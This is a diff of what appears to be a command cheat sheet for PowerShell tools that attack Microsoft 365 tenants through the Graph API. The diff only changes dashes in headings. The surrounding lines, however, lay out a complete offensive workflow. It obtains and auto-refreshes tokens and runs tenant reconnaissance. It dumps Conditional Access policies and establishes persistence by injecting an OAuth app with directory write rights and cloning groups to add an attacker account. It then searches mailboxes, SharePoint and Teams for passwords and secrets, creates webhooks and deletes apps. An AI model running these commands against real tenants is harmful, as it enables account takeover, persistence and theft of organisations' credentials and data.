@@ -58,7 +58,7 @@ Invoke-CheckAccess -Tokens $tokens  # Validates Graph reachability with current 
 # Run inside the folder created by Invoke-SearchMailbox to serve emailviewer.html
 Invoke-HTTPServer -port 8000  # Serves current directory files at http://localhost:8000/
 
-# Authentication modules — obtain/refresh tokens (user or app OAuth flows)
+# Authentication modules  - obtain/refresh tokens (user or app OAuth flows)
 
 Get-GraphTokens                                               # interactive device-code auth -> sets $Tokens, $TenantID
 Get-AzureAppTokens -ClientId $env:GRAPH_APP_CLIENT_ID -TenantId $env:GRAPH_APP_TENANT_ID -ClientSecret $env:GRAPH_APP_CLIENT_SECRET  # app auth -> sets $Tokens
@@ -66,7 +66,7 @@ Invoke-RefreshGraphTokens -Tokens $Tokens                      # use refresh_tok
 Invoke-CheckAccess -Tokens $Tokens                             # sanity-check current token / Graph reachability
 Invoke-AutoTokenRefresh -Tokens $Tokens -IntervalMinutes 25    # background refresh loop (use cautiously)
 
-# Recon & Enumeration — tenant, users, groups, apps, SharePoint/OneDrive, mailbox visibility, CA policies
+# Recon & Enumeration  - tenant, users, groups, apps, SharePoint/OneDrive, mailbox visibility, CA policies
 
 Invoke-GraphRecon -Tokens $Tokens -OutFile .\out\graph_recon.json                       # full tenant recon -> JSON
 Invoke-DumpCAPS -Tokens $Tokens -ResolveGuids -OutFile .\out\conditional_access.json   # dump Conditional Access (GUID->name)
@@ -74,7 +74,7 @@ Invoke-DumpApps -Tokens $Tokens -OutFile .\out\apps.json                        
 Get-AzureADUsers -Tokens $Tokens | Select DisplayName,UserPrincipalName,AccountEnabled,Id | Export-Csv .\out\users.csv -NoTypeInformation
 Get-SecurityGroups -Tokens $Tokens | Export-Csv .\out\security_groups.csv -NoTypeInformation
 
-# Persistence / Admin abuse — app injection, group cloning, guest invites, adding group members
+# Persistence / Admin abuse  - app injection, group cloning, guest invites, adding group members
 
 Invoke-InjectOAuthApp -Tokens $Tokens -AppName 'PoC-App' -RedirectUrl 'http://localhost' -Permissions 'Directory.ReadWrite.All'
 Invoke-SecurityGroupCloner -Tokens $Tokens -GroupId '<source-group-id>' -NewName 'Clone-<name>' -InjectUserUpn 'attacker@domain'
@@ -82,7 +82,7 @@ Invoke-InviteGuest -Tokens $Tokens -GuestEmail 'guest@example.com' -DisplayName 
 Invoke-AddGroupMember -Tokens $Tokens -GroupId '<group-id>' -MemberUpn 'user@domain'
 Invoke-DeleteOAuthApp -Tokens $Tokens -AppId '<app-id>'    # destructive: deletes app registration
 
-# Pillage / Data access — search mailboxes, Teams, SharePoint/OneDrive content (read-only if scopes permit)
+# Pillage / Data access  - search mailboxes, Teams, SharePoint/OneDrive content (read-only if scopes permit)
 
 Invoke-SearchMailbox -Tokens $Tokens -SearchTerm "password OR secret" -MessageCount 1000 -OutFile .\out\mail_secrets.csv -PageResults
 Invoke-SearchSharePointAndOneDrive -Tokens $Tokens -SearchTerm 'password filetype:xlsx' -PageResults -ResultCount 500 -OutFile .\out\sp_password_xlsx.csv
@@ -90,14 +90,14 @@ Invoke-SearchTeams -Tokens $Tokens -SearchTerm "credential OR token" -ResultSize
 Invoke-SearchUserAttributes -Tokens $Tokens -SearchTerm "api_key OR secret" -OutFile .\out\user_attribute_hits.csv
 # Download an identified item (read-only): Invoke-DriveFileDownload -Tokens $Tokens -DriveId '<drive-id>' -ItemId '<item-id>' -OutFile .\out\download.bin
 
-# Teams modules — enumerate channels, webhooks, create/send messages via webhooks
+# Teams modules  - enumerate channels, webhooks, create/send messages via webhooks
 
 Get-TeamsChannels -Tokens $Tokens | Export-Csv .\out\teams_channels.csv -NoTypeInformation
 Get-TeamsApps -Tokens $Tokens | Export-Csv .\out\teams_apps.csv -NoTypeInformation
 Get-Webhooks -Tokens $Tokens | Export-Csv .\out\teams_webhooks.csv -NoTypeInformation
 ## !! AUTH REQUIRED - Create-Webhook -Tokens $Tokens -TeamId '<team-id>' -ChannelId '<channel-id>' -Name 'pst-hook'    # creates webhook in channel
 ## Send a message via webhook (no Graph auth needed for legacy incoming webhook): Invoke-RestMethod -Uri '<webhook-url>' -Method Post -Body (ConvertTo-Json @{text='test message'})
-## Supplemental — cleanup helpers (delete apps, remove members), downloads, token import
+## Supplemental  - cleanup helpers (delete apps, remove members), downloads, token import
 
 # Delete OAuth app (requires authorization) - Invoke-DeleteOAuthApp -Tokens $Tokens -AppId '<app-id>'
 Invoke-RemoveGroupMember -Tokens $Tokens -GroupId '<group-id>' -MemberId '<member-id>'    # remove member (requires permission)
